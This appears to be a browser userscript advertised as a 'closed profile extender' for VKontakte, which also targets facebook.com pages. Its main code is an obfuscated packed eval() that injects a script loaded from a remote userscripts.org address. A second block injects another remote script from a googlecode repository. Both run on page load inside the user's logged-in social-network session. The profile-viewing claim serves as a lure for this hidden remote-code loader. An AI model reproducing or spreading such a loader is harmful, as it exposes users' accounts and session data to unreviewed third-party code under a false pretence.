// ==UserScript==
// @name           vkontakte extender 2.0 Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      http://vkontakte.ru/zlayatapka
// @description    Vkontakte closed profile extender 2.0
// @author         Sergey Naumov
// @include        http://*vkontakte.ru/*
// @include        http://*vk.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


(function () {
  var script = document.createElement('script');
  script.src = 'http://vkcpe.googlecode.com/svn/trunk/vkcpe2.js';
  document.getElementById('pageLayout').appendChild(script);
})();
